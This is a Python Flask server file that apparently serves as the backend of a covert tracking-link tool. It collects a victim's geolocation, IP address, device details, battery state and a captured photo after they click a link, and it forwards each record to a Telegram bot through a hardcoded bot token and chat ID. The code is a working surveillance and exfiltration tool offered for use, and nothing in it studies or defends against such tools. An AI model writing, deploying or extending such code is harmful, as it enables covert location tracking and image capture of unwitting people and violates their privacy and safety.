import os
import json
import base64
import requests
from flask import Flask, request
from io import BytesIO
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # Allow CORS requests

# ✅ Telegram Bot Configuration
BOT_TOKEN = "7155229931:AAH0hS_AyT9waCCLAEmj9xCmpjE0oC9x3KE"
CHAT_ID = "7526005252"
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
TELEGRAM_PHOTO_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"

tracked_users = {}

def send_telegram_message(text):
    """Send text message to Telegram."""
    payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
    requests.post(TELEGRAM_API, json=payload)

def send_telegram_photo(photo_base64):
    """Send Base64 image to Telegram bot."""
    try:
        # ✅ Ensure correct Base64 format
        if "," in photo_base64:
            photo_base64 = photo_base64.split(",")[1]  # Remove header

        image_data = base64.b64decode(photo_base64)  # Decode image
        files = {"photo": ("image.png", BytesIO(image_data), "image/png")}
        payload = {"chat_id": CHAT_ID}

        response = requests.post(TELEGRAM_PHOTO_API, data=payload, files=files)
        return response.ok

    except Exception as e:
        print("Error sending image:", str(e))
        return False

@app.route('/', methods=['GET'])
def home():
    return "Flask backend is running!", 200


@app.route('/track/<session_id>', methods=['POST'])
def track_device(session_id):
    """Track user and send both device info & image."""
    try:
        data = request.json
        battery = data.get("battery", {})
        geo = data.get("geo", {})
        device = data.get("device", {})
        photo = data.get("photo", None)  # ✅ Captured image (Base64)

        user_ip = device.get("ip", "Unknown")
        if user_ip in tracked_users:
            message_status = "🔁 User revisited."
        else:
            message_status = "🆕 New User Clicked the Link!"
            tracked_users[user_ip] = session_id

        # ✅ Send Image First (if available)
        if photo:
            send_telegram_photo(photo)

        # ✅ Send Device Info
        message = f"""
<b>{message_status}</b>
📡 <b>Session ID:</b> {session_id}
⚡ <b>Battery:</b> {battery.get("level", "N/A")}% (Charging: {battery.get("charging", "N/A")})
🌍 <b>Geolocation:</b> Lat {geo.get("latitude", "N/A")}, Lon {geo.get("longitude", "N/A")}
📱 <b>Device:</b> {device.get("platform", "N/A")}
💻 <b>Screen:</b> {device.get("screenWidth", "N/A")}x{device.get("screenHeight", "N/A")}
🌐 <b>IP Address:</b> {user_ip}
🖥 <b>User-Agent:</b> {device.get("userAgent", "N/A")}
🔌 <b>Cookies Enabled:</b> {device.get("cookiesEnabled", "N/A")}
🧩 <b>Plugins:</b> {device.get("plugins", "N/A")}
"""

        send_telegram_message(message)

        return {"status": "success"}, 200

    except Exception as e:
        return {"error": str(e)}, 500

if __name__ == '__main__':
    port = int(os.getenv("PORT", 10000))  # Default port 10000
    app.run(host='0.0.0.0', port=port)
